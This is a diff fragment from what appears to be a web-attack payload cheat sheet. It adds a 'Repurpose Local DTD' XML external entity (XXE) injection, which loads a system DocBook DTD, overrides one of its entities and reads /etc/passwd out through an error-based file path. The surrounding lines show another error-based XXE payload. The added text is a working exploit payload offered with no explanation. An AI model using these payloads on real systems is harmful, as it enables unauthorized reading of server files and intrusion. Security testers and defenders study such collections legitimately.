@@ -564,6 +564,21 @@ external dtd file
 <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
 %eval;
 %error;
+
+Repurpose Local DTD
+
+<!DOCTYPE root [
+    <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
+
+    <!ENTITY % ISOamsa '
+        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
+        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///abcxyz/&#x25;file;&#x27;>">
+        &#x25;eval;
+        &#x25;error;
+        '>
+
+    %local_dtd;
+]>
 ```
 
 ### xss via file upload
